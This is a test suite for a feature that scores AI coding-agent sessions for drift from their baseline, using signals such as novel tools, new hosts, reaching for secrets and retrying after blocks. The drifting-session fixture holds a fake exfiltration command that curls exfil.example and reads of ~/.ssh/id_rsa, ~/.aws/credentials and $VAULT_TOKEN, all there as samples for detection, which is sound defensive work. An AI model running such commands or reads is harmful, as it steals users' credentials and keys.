"""
Session Drift Score: one number per governed session against its own
baseline, observe only.

Fixtures are whole sessions written into a real migrated database: a normal
session that repeats what the folder always does, a drifting one, a folder
still building its baseline, a device with too few hosts for host features,
a folder with no baseline (harness-only fallback), and "looks normal"
feedback changing the next compute. Plus the 100k-row timing budget.
"""

import asyncio
import json
import re
import sqlite3
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from securevector.app.database.connection import DatabaseConnection
from securevector.app.database.migrations import (
    ensure_session_drift_table,
    init_database_schema,
    migrate_to_v56,
    run_migrations,
)
from securevector.app.database.repositories.session_drift import SessionDriftRepository
from securevector.app.services import session_drift as drift
from securevector.app.terminals import live_runs

HARNESS = "claude-code"
APP = "/w/app"
NOW = datetime.now(timezone.utc)
KNOWN_TOOLS = ("Read", "Edit", "Bash", "Grep")
FOLDER_HOSTS = ("pypi.org", "api.github.com", "known0.example", "known1.example")
UNSEEN_TOOLS = ("WebFetch", "NotebookEdit", "mcp__x__dump", "Task", "KillShell", "Glob")


def _sql_ts(dt):
    return dt.strftime("%Y-%m-%d %H:%M:%S")


def _iso(dt):
    return dt.isoformat(timespec="milliseconds")


class World:
    """A migrated database plus helpers that write sessions into it."""

    def __init__(self, tmp_path: Path):
        tmp_path.mkdir(parents=True, exist_ok=True)
        self.path = tmp_path / "drift.db"
        self.db = DatabaseConnection(self.path)
        asyncio.run(run_migrations(self.db))
        # What init_database_schema does at startup, without the rule loads.
        asyncio.run(ensure_session_drift_table(self.db))
        self.raw = sqlite3.connect(self.path)
        self.n = 0
        drift.clear_cache()

    def task(self, sid, workspace=APP, ended=True, executor=HARNESS, days_ago=1):
        self.n += 1
        created = NOW - timedelta(days=days_ago, hours=1)
        self.raw.execute(
            "INSERT INTO terminal_tasks (id, executor_id, workspace, status, session_id, created_at, ended_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (f"t{self.n}-{sid}", executor, workspace, "done" if ended else "working", sid,
             _iso(created), _iso(NOW - timedelta(days=days_ago)) if ended else None),
        )
        self.raw.commit()
        return f"t{self.n}-{sid}"

    def calls(self, sid, rows, start=None, runtime=HARNESS):
        """rows: (tool, action, args_preview, reason) tuples, one second apart."""
        t0 = start or (NOW - timedelta(hours=2))
        self.raw.executemany(
            "INSERT INTO tool_call_audit (tool_id, function_name, action, args_preview, reason, called_at, "
            "session_id, runtime_kind) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            [(tool, tool, action, args, reason, _sql_ts(t0 + timedelta(seconds=5 * i)), sid, runtime)
             for i, (tool, action, args, reason) in enumerate(rows)],
        )
        self.raw.commit()

    def hosts(self, sid, hosts, start=None):
        t0 = start or (NOW - timedelta(hours=2))
        self.raw.executemany(
            "INSERT INTO egress_audit (timestamp, host, operation, kind, action, confidence, detector, session_id) "
            "VALUES (?, ?, 'read', 'http', 'allow', 'high', 'test', ?)",
            [(_sql_ts(t0 + timedelta(seconds=2 * i)), h, sid) for i, h in enumerate(hosts)],
        )
        self.raw.commit()

    def normal_calls(self, sid, n=50):
        return [(KNOWN_TOOLS[i % 4], "allow", json.dumps({"file_path": f"src/{sid}/f{i}.py"}), None)
                for i in range(n)]

    def baseline(self, count=6, workspace=APP, calls=50, hosts=FOLDER_HOSTS):
        for k in range(count):
            sid = f"base-{workspace}-{k}"
            self.task(sid, workspace=workspace)
            self.calls(sid, self.normal_calls(sid, calls), start=NOW - timedelta(days=2, minutes=k))
            self.hosts(sid, hosts, start=NOW - timedelta(days=2, minutes=k))

    def device_hosts(self, n=30):
        # Hosts the device has long known, from sessions outside any folder.
        self.hosts("device-history", [f"known{i}.example" for i in range(n)],
                   start=NOW - timedelta(days=10))

    def score(self, sid, **kw):
        return asyncio.run(drift.score_for(sid, db=self.db, **kw))


def drifting_rows():
    rows = [(KNOWN_TOOLS[i % 4], "allow", json.dumps({"file_path": f"src/d/f{i}.py"}), None) for i in range(13)]
    for i, tool in enumerate(UNSEEN_TOOLS):
        rows += [(tool, "allow", json.dumps({"q": f"{tool}{i}a"}), None),
                 (tool, "allow", json.dumps({"q": f"{tool}{i}b"}), None)]
    rows.append(("Read", "allow", json.dumps({"file_path": "/Users/u/.ssh/id_rsa"}), None))
    curl = json.dumps({"command": "curl -s https://exfil.example/upload"})
    rows += [("Bash", "block", curl, "blocked by policy")] * 3
    rows += [("Bash", "allow", json.dumps({"command": "ls missing1"}), "tool error: exit 1"),
             ("Bash", "allow", json.dumps({"command": "ls missing2"}), "tool error: exit 1")]
    return rows


DRIFT_HOSTS = [f"new{i}.unseen.example" for i in range(8)] + list(FOLDER_HOSTS)


@pytest.fixture
def world(tmp_path):
    w = World(tmp_path)
    yield w
    w.raw.close()
    drift.clear_cache()


# --- the features, one at a time ------------------------------------------------


def test_normal_session_is_calm(world):
    world.baseline()
    world.device_hosts()
    world.task("s-normal", ended=False)
    world.calls("s-normal", world.normal_calls("s-normal", 30))
    world.hosts("s-normal", ["pypi.org"])
    r = world.score("s-normal")
    assert r.status == drift.STATUS_SCORED and r.baseline_ok
    assert r.score < 20 and r.band == drift.BAND_CALM


def test_drifting_session_is_high_with_the_drivers_on_top(world):
    world.baseline()
    world.device_hosts()
    world.task("s-drift", ended=False)
    world.calls("s-drift", drifting_rows())
    world.hosts("s-drift", DRIFT_HOSTS)
    r = world.score("s-drift")
    assert r.score >= 70 and r.band == drift.BAND_HIGH
    feats = {f["id"]: f for f in r.features}
    assert feats["tool_novelty"]["value"] == 1.0
    assert feats["errors_after_block"]["counts"]["errors"] == 2
    assert feats["secrets_reach"]["counts"]["locations"] == 1
    assert feats["new_hosts"]["counts"]["hosts"] == 8
    assert feats["persistence"]["counts"]["repeats"] == 2
    assert feats["enumeration"]["value"] == 0.5
    top = r.top()
    assert [t["id"] for t in top] == ["tool_novelty", "new_hosts", "errors_after_block"]
    assert top[0]["detail"] == "12 of 31 calls"
    assert top[0]["label"] == "tools this session has not used here before"


def test_each_feature_is_zero_on_ordinary_rows():
    base = drift.Baseline(sessions=6, calls=300, tools=frozenset(KNOWN_TOOLS), hosts=frozenset({"pypi.org"}))
    rows = [{"function_name": "Read", "action": "allow", "args_preview": '{"file_path": "a.py"}',
             "called_at": _sql_ts(NOW)}]
    r = drift.compute(rows, {"hosts": ["pypi.org"], "distinct_hosts": 1}, 40, [], base, {})
    assert all(f["value"] == 0 for f in r.features) and r.score == 0


def test_errors_only_count_inside_the_window():
    t0 = NOW
    rows = [
        {"function_name": "Bash", "action": "block", "called_at": _sql_ts(t0)},
        {"function_name": "Bash", "action": "allow", "reason": "tool error: x", "called_at": _sql_ts(t0 + timedelta(seconds=60))},
        {"function_name": "Bash", "action": "allow", "reason": "tool error: x", "called_at": _sql_ts(t0 + timedelta(seconds=300))},
    ]
    assert drift.feature_errors_after_block(rows)["counts"]["errors"] == 1


def test_secrets_reach_ignores_blocked_calls_and_routine_locations():
    rows = [
        {"function_name": "Read", "action": "block", "args_preview": '{"file_path": "~/.ssh/id_rsa"}'},
        {"function_name": "Read", "action": "allow", "args_preview": '{"file_path": "/home/u/.aws/credentials"}'},
        {"function_name": "Bash", "action": "allow", "args_preview": '{"command": "echo $VAULT_TOKEN"}'},
        {"function_name": "Bash", "action": "allow", "args_preview": '{"command": "echo $VAULT_TOKEN_PATH"}'},
    ]
    locs = drift.locations_in(rows)
    assert locs == {"/.aws/credentials", "$VAULT_TOKEN"}
    # A deploy folder that always reads ~/.aws/ scores 0 there.
    f = drift.feature_secrets_reach(locs, {"/.aws/credentials": 4})
    assert f["counts"]["locations"] == 1


def test_persistence_counts_reblocks_and_jit_refiles():
    rows = [{"function_name": "Bash", "action": "block"}] * 4
    jit = [
        {"tool_id": "WebFetch", "status": "denied", "requested_at": "2026-10-08 10:00:00"},
        {"tool_id": "WebFetch", "status": "pending", "requested_at": "2026-10-08 10:01:00"},
    ]
    f = drift.feature_persistence(rows, jit)
    assert f["counts"]["repeats"] == 4 and f["value"] == 1.0


# --- cold start, partial, fallback, feedback ------------------------------------------


def test_cold_start_builds_baseline_without_a_number(world):
    world.baseline(count=3)
    world.task("s-new", ended=False)
    world.calls("s-new", drifting_rows())
    r = world.score("s-new")
    assert r.status == drift.STATUS_BUILDING and r.score is None and r.band is None
    assert r.baseline["sessions"] == 3 and not r.baseline_ok
    p = drift.payload(r)
    assert p["score"] is None and p["baseline"]["needed_sessions"] == 5


def test_running_session_never_scores_itself(world):
    world.baseline(count=4)
    world.task("s-run", ended=False)
    world.calls("s-run", world.normal_calls("s-run", 300))
    assert world.score("s-run").status == drift.STATUS_BUILDING


def test_partial_skips_host_features_and_renormalises(world):
    world.baseline()
    # No device host history: fewer than MIN_BASELINE_HOSTS known hosts.
    world.task("s-drift", ended=False)
    world.calls("s-drift", drifting_rows())
    world.hosts("s-drift", DRIFT_HOSTS[:8])
    r = world.score("s-drift")
    assert r.status == drift.STATUS_PARTIAL
    skipped = {f["id"] for f in r.features if f["skipped"]}
    assert skipped == {"enumeration", "new_hosts"}
    live = [f for f in r.features if not f["skipped"]]
    assert sum(f["weight"] for f in live) == 70
    expected = round(100 * sum(f["weight"] * f["value"] for f in live) / 70)
    assert r.score == expected


def test_harness_only_fallback_while_folder_has_no_baseline(world):
    world.baseline(workspace="/w/other")
    world.device_hosts()
    world.task("s-fresh", workspace="/w/brand-new", ended=False)
    world.calls("s-fresh", world.normal_calls("s-fresh", 20))
    r = world.score("s-fresh")
    assert r.baseline_ok and r.baseline["scope"] == drift.SCOPE_HARNESS


def test_folder_baseline_is_preferred_when_it_exists(world):
    world.baseline(workspace=APP)
    world.baseline(workspace="/w/deploy")
    world.calls("base-/w/deploy-0", [("Deploy", "allow", "{}", None)] * 20)
    world.device_hosts()
    world.task("s-app", ended=False)
    world.calls("s-app", [("Deploy", "allow", json.dumps({"n": i}), None) for i in range(10)])
    r = world.score("s-app")
    assert r.baseline["scope"] == drift.SCOPE_FOLDER
    # Deploy is routine in /w/deploy, not in this folder.
    assert {f["id"]: f for f in r.features}["tool_novelty"]["value"] == 1.0


def test_looks_normal_changes_the_next_compute(world):
    world.baseline()
    world.device_hosts()
    # Ended before the 30-day window, so only the mark can bring it back in.
    world.task("s-first", ended=True, days_ago=40)
    world.calls("s-first", drifting_rows())
    world.hosts("s-first", DRIFT_HOSTS)
    world.task("s-second", ended=False)
    world.calls("s-second", drifting_rows())
    world.hosts("s-second", DRIFT_HOSTS)
    before = world.score("s-second").score
    world.score("s-first")
    repo = SessionDriftRepository(world.db)
    assert asyncio.run(repo.set_feedback("s-first"))
    drift.clear_cache()
    after = world.score("s-second")
    assert after.score < before
    assert {f["id"]: f for f in after.features}["tool_novelty"]["value"] == 0
    # The mark survives a recompute of the marked session itself.
    world.score("s-first")
    row = asyncio.run(repo.get("s-first"))
    assert row["feedback"] == "normal"
    rate = asyncio.run(repo.false_flag_rate())
    assert rate["high"] >= 1 and rate["marked_normal"] == 1


def test_running_session_marked_normal_never_enters_the_baseline(world):
    world.baseline()
    world.device_hosts()
    world.task("s-agent", ended=False)
    world.calls("s-agent", drifting_rows())
    world.hosts("s-agent", DRIFT_HOSTS)
    world.task("s-other", ended=False)
    world.calls("s-other", drifting_rows())
    world.hosts("s-other", DRIFT_HOSTS)
    before = world.score("s-other").score
    world.score("s-agent")
    # Even a mark written straight to the row (bypassing the route's 409)
    # does not fold a running session into anyone's baseline.
    assert asyncio.run(SessionDriftRepository(world.db).set_feedback("s-agent"))
    drift.clear_cache()
    assert world.score("s-other").score == before
    assert "s-agent" not in asyncio.run(
        SessionDriftRepository(world.db).baseline_sessions(HARNESS, NOW - timedelta(days=30)))


def test_baseline_window_is_filtered_in_sql(world):
    world.baseline()
    world.task("old", days_ago=45)
    world.calls("old", world.normal_calls("old", 10))
    got = asyncio.run(SessionDriftRepository(world.db).baseline_sessions(HARNESS, NOW - timedelta(days=30)))
    assert "old" not in got and len(got) == 6
    src = Path(SessionDriftRepository.__module__.replace(".", "/") + ".py")
    text = (Path(__file__).resolve().parents[3] / "src" / src).read_text()
    assert "ended_at >= ?" in text


def test_baseline_cache_is_per_database(tmp_path):
    a, b = World(tmp_path / "a"), World(tmp_path / "b")
    try:
        a.baseline()
        a.task("s", ended=False)
        a.calls("s", a.normal_calls("s", 5))
        b.task("s", ended=False)
        b.calls("s", b.normal_calls("s", 5))
        assert a.score("s").baseline_ok
        # Same harness, other database, no clear_cache: must not reuse a's.
        assert b.score("s").status == drift.STATUS_BUILDING
    finally:
        a.raw.close()
        b.raw.close()


def test_startup_creates_the_table_and_repository_issues_no_ddl(tmp_path):
    db = DatabaseConnection(tmp_path / "boot.db")
    asyncio.run(init_database_schema(db))
    raw = sqlite3.connect(tmp_path / "boot.db")
    assert raw.execute("SELECT name FROM sqlite_master WHERE name = 'session_drift'").fetchone()
    raw.close()
    repo_src = (Path(__file__).resolve().parents[3]
                / "src/securevector/app/database/repositories/session_drift.py").read_text()
    for ddl in ("CREATE ", "ALTER ", "DROP ", "executescript", "ensure_session_drift_table"):
        assert ddl not in repo_src, ddl
    mig_src = (Path(__file__).resolve().parents[3] / "src/securevector/app/database/migrations.py").read_text()
    body = mig_src[mig_src.index("async def ensure_session_drift_table"):mig_src.index("async def migrate_to_v56")]
    assert "executescript" not in body
    # Without the startup call the repository fails rather than creating it.
    bare = DatabaseConnection(tmp_path / "bare.db")
    asyncio.run(run_migrations(bare))
    with pytest.raises(Exception):
        asyncio.run(SessionDriftRepository(bare).get("x"))


def test_stored_row_holds_counts_only(world):
    world.baseline()
    world.device_hosts()
    world.task("s-drift", ended=False)
    world.calls("s-drift", drifting_rows())
    world.hosts("s-drift", DRIFT_HOSTS)
    world.score("s-drift")
    row = asyncio.run(SessionDriftRepository(world.db).get("s-drift"))
    blob = json.dumps(row)
    for leaked in (".ssh", "exfil.example", "unseen.example", "WebFetch", "curl", "/w/app/"):
        assert leaked not in row["features_json"], leaked
    assert row["score"] >= 70 and row["band"] == "high"
    assert "id_rsa" not in blob
    rebuilt = drift.result_from_row(row)
    assert rebuilt.top()[0]["id"] == "tool_novelty"


def test_bands_and_contract():
    assert drift.BANDS == ("calm", "watch", "high")
    assert drift.band_for(39) == "calm" and drift.band_for(40) == "watch"
    assert drift.band_for(69) == "watch" and drift.band_for(70) == "high"
    assert [w for _, _, w in drift.FEATURES] == [25, 20, 15, 15, 15, 10]
    assert set(drift.DriftResult.__dataclass_fields__) >= {
        "score", "band", "status", "features", "baseline_ok", "computed_at"}


def test_warm_once_scores_running_sessions_only(world):
    world.baseline()
    world.device_hosts()
    world.task("s-live", ended=False)
    world.calls("s-live", world.normal_calls("s-live", 10))
    done = asyncio.run(drift.warm_once(world.db))
    assert done == ["s-live"]


def test_migration_v56_is_idempotent(world):
    asyncio.run(migrate_to_v56(world.db))
    asyncio.run(migrate_to_v56(world.db))
    rows = world.raw.execute("SELECT version FROM schema_version WHERE version = 56").fetchall()
    assert rows == [(56,)]
    cols = {r[1] for r in world.raw.execute("PRAGMA table_info(session_drift)")}
    assert {"session_id", "task_id", "harness", "workspace", "score", "band", "status", "features_json",
            "baseline_sessions", "baseline_calls", "feedback", "computed_at"} <= cols


# --- what may leave the device -------------------------------------------------------


def test_cloud_fields_are_closed_and_scalar():
    assert live_runs.DRIFT_FEATURE_IDS == set(drift.FEATURE_IDS)
    assert {"drift_score", "drift_top"} <= live_runs.TASK_FIELD_ALLOWLIST
    top = [{"id": "tool_novelty", "label": "x"}, "new_hosts", "WebFetch", "errors_after_block", "persistence"]
    out = live_runs.drift_fields(75, top)
    assert out == {"drift_score": 75, "drift_top": "tool_novelty,new_hosts,errors_after_block"}
    assert live_runs.drift_fields(250, ["/etc/passwd"]) == {"drift_score": None, "drift_top": None}
    assert live_runs.drift_fields("62", None) == {"drift_score": 62, "drift_top": None}


def test_task_event_refuses_any_extra_drift_field():
    from securevector.app.database.repositories.external_forwarders import build_task_event_payload

    payload = live_runs.build_payload({"id": "abc", "executor_id": "claude-code"}, "exit")
    for extra in ({"drift_label": "tools this session"}, {"drift_hosts": "x.example"}):
        with pytest.raises(ValueError):
            build_task_event_payload({**payload, **extra})


def test_copy_follows_the_naming_rules():
    web = Path(__file__).resolve().parents[3] / "src/securevector/app/assets/web/js/pages/terminals.js"
    js = web.read_text()
    start = js.index("_driftHtml(d)")
    block = js[start:js.index("_summaryExport(s)", start)]
    texts = list(drift.LABELS.values()) + [block]
    for text in texts:
        assert "—" not in text
        for banned in ("firewall", "Mission Control", "attack"):
            assert banned.lower() not in text.lower(), banned


def test_observe_only_no_path_from_score_to_action():
    src = Path(drift.__file__).read_text()
    for forbidden in ("policy_engine", ".stop(", "approve", "deny_jit", "live_runs.emit", "httpx", "requests."):
        assert forbidden not in src, forbidden


# --- timing --------------------------------------------------------------------------


@pytest.mark.benchmark
def test_scoring_stays_under_50ms_on_100k_audit_rows(tmp_path):
    w = World(tmp_path)
    try:
        rnd = 0
        tools = KNOWN_TOOLS + ("Write", "WebSearch", "TodoWrite")
        task_rows, call_rows, host_rows = [], [], []
        workspaces = [f"/w/repo{i}" for i in range(10)]
        for s in range(330):
            sid = f"perf-{s}"
            ws = workspaces[s % 10]
            ended = NOW - timedelta(days=(s % 29) + 1)
            task_rows.append((f"pt{s}", HARNESS if s % 3 else "codex", ws, "done", sid,
                              _iso(ended - timedelta(hours=1)), _iso(ended)))
            for i in range(304):
                rnd += 1
                call_rows.append((tools[(s + i) % 7], tools[(s + i) % 7], "allow",
                                  json.dumps({"file_path": f"src/m{i % 40}.py"}), None,
                                  _sql_ts(ended - timedelta(minutes=50) + timedelta(seconds=i)), sid,
                                  HARNESS if s % 3 else "codex"))
            for i in range(30):
                host_rows.append((_sql_ts(ended - timedelta(minutes=40)), f"h{(s * 7 + i) % 400}.example", sid))
        w.raw.executemany(
            "INSERT INTO terminal_tasks (id, executor_id, workspace, status, session_id, created_at, ended_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)", task_rows)
        w.raw.executemany(
            "INSERT INTO tool_call_audit (tool_id, function_name, action, args_preview, reason, called_at, "
            "session_id, runtime_kind) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", call_rows)
        w.raw.executemany(
            "INSERT INTO egress_audit (timestamp, host, operation, kind, action, confidence, detector, session_id) "
            "VALUES (?, ?, 'read', 'http', 'allow', 'high', 'test', ?)", host_rows)
        w.raw.commit()
        assert w.raw.execute("SELECT COUNT(*) FROM tool_call_audit").fetchone()[0] >= 100_000
        w.task("s-perf", workspace="/w/repo1", ended=False)
        w.calls("s-perf", drifting_rows() * 10)
        w.hosts("s-perf", DRIFT_HOSTS)
        w.score("s-perf")  # connection, table check and first baseline read
        best_cold, best_warm = 1e9, 1e9
        for _ in range(5):
            drift.clear_cache()
            t = time.perf_counter()
            r = w.score("s-perf")
            best_cold = min(best_cold, time.perf_counter() - t)
            t = time.perf_counter()
            w.score("s-perf")
            best_warm = min(best_warm, time.perf_counter() - t)
        assert r.baseline_ok
        # The design budget: under 50 ms per score on 100k audit rows, with
        # the baseline cached for 60 s as it is in the warm loop.
        assert best_warm < 0.050, best_warm
        # Best of five runs, so one slow scheduler tick cannot fail it; the
        # measured figure is about 7 ms, so 50 ms is a 7x margin. A cold
        # baseline read (once a minute per harness) stays bounded too.
        assert best_cold < 0.150, best_cold
    finally:
        w.raw.close()
        drift.clear_cache()


def test_drift_rows_age_out_with_audit_retention(world):
    from securevector.app.database.migrations import cleanup_old_event_records

    old = (NOW - timedelta(days=400)).isoformat(timespec="seconds")
    new = NOW.isoformat(timespec="seconds")
    world.raw.executemany(
        "INSERT INTO session_drift (session_id, status, computed_at) VALUES (?, 'scored', ?)",
        [("ancient", old), ("fresh", new)],
    )
    world.raw.commit()
    asyncio.run(cleanup_old_event_records(world.db))
    left = {r[0] for r in world.raw.execute("SELECT session_id FROM session_drift")}
    assert left == {"fresh"}
